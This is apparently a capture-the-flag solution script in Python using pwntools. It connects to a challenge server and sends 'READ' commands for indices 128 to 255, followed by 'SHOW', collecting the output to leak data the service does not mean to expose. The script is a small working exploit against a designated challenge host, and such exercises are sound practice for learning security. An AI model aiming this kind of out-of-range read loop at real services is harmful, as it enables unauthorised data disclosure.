from pwn import *

c = remote("binary.hashbangctf.com", 5001)

c.recvline()
i = 128
result = ""
while (i <256):
	payload = "READ" + " " + str(i)
	c.sendline(payload)
	c.sendline("SHOW")
	result += c.recvline()
	i+=1

print result
